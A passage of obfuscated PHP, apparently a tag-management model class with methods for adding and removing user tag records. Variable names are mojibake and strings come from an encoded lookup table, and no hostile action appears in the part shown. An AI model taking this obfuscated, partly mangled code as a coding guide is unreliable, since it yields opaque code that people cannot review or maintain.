Ò¶Ãğé[$«¯ÑÑìª[33]]; if (isset($ Ò¶Ãğé[$«¯ÑÑìª[496]])) { $ŸĞ›‹­‹ = $ Ò¶Ãğé[$«¯ÑÑìª[496]] == $«¯ÑÑìª[91] ? $«¯ÑÑìª[78] : $«¯ÑÑìª[233]; } } $ãÍ±¿ = array($«¯ÑÑìª[1782] => USER_ID, $«¯ÑÑìª[570] => $™›İÚ°, $«¯ÑÑìª[506] => $™¾Í§Ç, $«¯ÑÑìª[507] => $ŸĞ›‹­‹ ? $ŸĞ›‹­‹ : $«¯ÑÑìª[501], $«¯ÑÑìª[505] => $´¡˜’€è ? $´¡˜’€è : $«¯ÑÑìª[12], $«¯ÑÑìª[1995] => 0); if ($this->where($ãÍ±¿)->find()) { return !1; } return $this->add($ãÍ±¿); } protected function removeFromTag($İøÕÅµ, $‰¸ìÙ–¶) { $‰óñÔ¡† =& $_SERVER[®»±”ó²]; if (!Model($‰óñÔ¡†[2261])->listData($‰¸ìÙ–¶)) { return !1; } if (is_array($İøÕÅµ)) { $İøÕÅµ = array($‰óñÔ¡†[7], $İøÕÅµ); } $Âû±Ñ×¸ = array($‰óñÔ¡†[1782] => USER_ID, $‰óñÔ¡†[570] => $‰¸ìÙ–¶, $‰óñÔ¡†[506] => $İøÕÅµ); return $this->where($Âû±Ñ×¸)->delete(); } protected function removeByTag($ßˆ‘Öİô) { $é¤¶µÀ¶ =& $_SERVER[®»±”ó²]; if (!$ßˆ‘Öİô) { return !1; } $·»Îğœö = array($é¤¶µÀ¶[1782] => USER_ID, $é¤¶µÀ¶[570] => $ßˆ‘Öİô); return $this->where($·»Îğœö)->delete(); } protected function removeBySource($Á“”êÓÛ) { $¬„øš·ä =& $_SERVER[®»±”ó²]; if (is_array($Á“”êÓÛ)) { $Á“”êÓÛ = array($¬„øš·ä[7], $Á“”êÓÛ); } $ÛåÓÁ‹¹ = array($¬„øš·ä[1782] => USER_ID, $¬„øš·ä[570] => array($¬„øš·ä[1101], 0), $¬„øš·ä[506] => $Á“”êÓÛ); return $this->where($ÛåÓÁ‹¹)->delete(); } }